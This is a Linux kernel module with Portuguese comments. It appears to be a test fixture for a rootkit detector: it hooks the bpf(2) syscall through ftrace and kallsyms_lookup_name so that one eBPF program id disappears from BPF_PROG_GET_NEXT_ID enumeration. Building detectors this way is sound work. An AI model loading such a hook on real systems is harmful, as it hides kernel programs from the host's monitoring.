// Módulo de PROVA para o cenário RK-bpf-hidden. NÃO é malicioso.
//
// A pergunta é a do cross.bpf_hidden, que é a do cross.hidden_pid um nível
// acima, no kernel: um programa eBPF CITADO — um processo segura o descritor,
// então /proc/<pid>/fdinfo mostra o prog_id — continua aparecendo quando se
// pede a LISTA? Não, se a enumeração foi adulterada. E as duas fontes vêm do
// mesmo kernel: uma entrega o objeto, a outra o nega.
//
//   citado    /proc/<pid>/fdinfo/<fd> traz "prog_id: X" (leitura de /proc)
//   listado   bpf(BPF_PROG_GET_NEXT_ID) devolve os ids um a um (syscall bpf)
//
// Este módulo esconde X da SEGUNDA fonte: hooka a bpf(2) e, quando o
// GET_NEXT_ID ia devolver o id escondido, re-emite a chamada a partir dele para
// pular ao próximo. A leitura de fdinfo (a primeira fonte) não passa pela bpf(2),
// então continua citando X. É a divergência que o check acusa.
//
// COMO (e por que igual ao pid-hide): ftrace na __x64_sys_bpf, chamando a
// original por um `call *` CRU para a guarda within_module reconhecer a própria
// re-entrada — a tabela de syscall é no-op neste kernel (switch inlined) e o
// within_module sozinho recursa com retpoline. Ver pid-hide-module.c para o
// porquê de cada peça.
//
// SEGURANÇA: só dentro da VM descartável. Esconder programa de kernel do
// enumerador cegaria o host de verdade até o rmmod.
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("prova de que fdinfo cita um prog eBPF que a enumeracao nega - aletheia");

// O id do programa a esconder da enumeração. 0 = nada a esconder.
static uint oculto;
module_param(oculto, uint, 0);
MODULE_PARM_DESC(oculto, "prog_id do eBPF a filtrar do BPF_PROG_GET_NEXT_ID");

// --- kallsyms_lookup_name via kprobe: não exportado desde o 5.7. Igual socknd. ---
static unsigned long (*kln)(const char *);

static int resolver_kln(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	if (register_kprobe(&kp) < 0)
		return -1;
	kln = (void *)kp.addr;
	unregister_kprobe(&kp);
	return kln ? 0 : -1;
}

static asmlinkage long (*real_bpf)(const struct pt_regs *);
static struct ftrace_ops ops_bpf;

// chamar_original: `call *` cru, sem o thunk de retpoline, para o parent_ip do
// fentry aninhado cair DENTRO deste módulo e within_module reconhecer a própria
// chamada (senão recursão infinita — ver pid-hide-module.c).
static long notrace chamar_original(const struct pt_regs *regs)
{
	long ret;
	asm volatile(
		"movq %1, %%rdi\n\t"
		"call *%2\n\t"
		"movq %%rax, %0\n\t"
		: "=r"(ret)
		: "r"(regs), "r"(real_bpf)
		: "rax", "rdi", "rsi", "rdx", "rcx", "r8", "r9", "r10", "r11",
		  "memory", "cc");
	return ret;
}

// GET_NEXT_ID recebe start_id (offset 0 do bpf_attr) e devolve next_id (offset
// 4): o menor id de programa MAIOR que start_id, ou -ENOENT quando não há.
#define OFF_START_ID 0
#define OFF_NEXT_ID  4

static asmlinkage long hooked_bpf(const struct pt_regs *regs)
{
	int cmd = (int)regs->di;
	void __user *uattr = (void __user *)regs->si;
	unsigned int size = (unsigned int)regs->dx;
	long ret = chamar_original(regs);
	u32 next;

	if (cmd != BPF_PROG_GET_NEXT_ID || ret != 0 || oculto == 0 || size < 8)
		return ret;
	if (get_user(next, (u32 __user *)(uattr + OFF_NEXT_ID)))
		return ret;
	if (next != oculto)
		return ret; // não é o escondido: passa direto

	// O próximo id É o escondido. Avança a enumeração para DEPOIS dele: põe
	// start_id = oculto e re-emite. O kernel devolve o próximo id > oculto (e o
	// grava em next_id), ou -ENOENT se era o último — encerrando a enumeração
	// sem que o escondido apareça. Quem lê fdinfo continua citando-o.
	if (put_user((u32)oculto, (u32 __user *)(uattr + OFF_START_ID)))
		return ret;
	return chamar_original(regs);
}

static void notrace thunk_bpf(unsigned long ip, unsigned long parent_ip,
			      struct ftrace_ops *o, struct ftrace_regs *fregs)
{
	struct pt_regs *regs;
	if (within_module(parent_ip, THIS_MODULE))
		return; // veio da nossa chamada à original: deixa correr
	regs = ftrace_get_regs(fregs);
	regs->ip = (unsigned long)hooked_bpf;
}

static int __init bh_init(void)
{
	unsigned long alvo;

	if (resolver_kln() != 0) {
		pr_err("bpf-hide: kallsyms_lookup_name não resolvido\n");
		return -EINVAL;
	}
	alvo = kln("__x64_sys_bpf");
	if (!alvo) {
		pr_err("bpf-hide: __x64_sys_bpf não resolvido\n");
		return -EINVAL;
	}
	real_bpf = (void *)alvo;
	ops_bpf.func = thunk_bpf;
	ops_bpf.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
	if (ftrace_set_filter_ip(&ops_bpf, alvo, 0, 0)) {
		pr_err("bpf-hide: ftrace_set_filter_ip falhou\n");
		return -EINVAL;
	}
	if (register_ftrace_function(&ops_bpf)) {
		pr_err("bpf-hide: register_ftrace_function falhou\n");
		ftrace_set_filter_ip(&ops_bpf, alvo, 1, 0);
		return -EINVAL;
	}
	pr_info("bpf-hide: bpf(2) hookado por ftrace, escondendo prog_id=%u\n", oculto);
	return 0;
}

static void __exit bh_exit(void)
{
	unregister_ftrace_function(&ops_bpf);
	ftrace_set_filter_ip(&ops_bpf, (unsigned long)real_bpf, 1, 0);
	pr_info("bpf-hide: hook de bpf(2) removido\n");
}

module_init(bh_init);
module_exit(bh_exit);
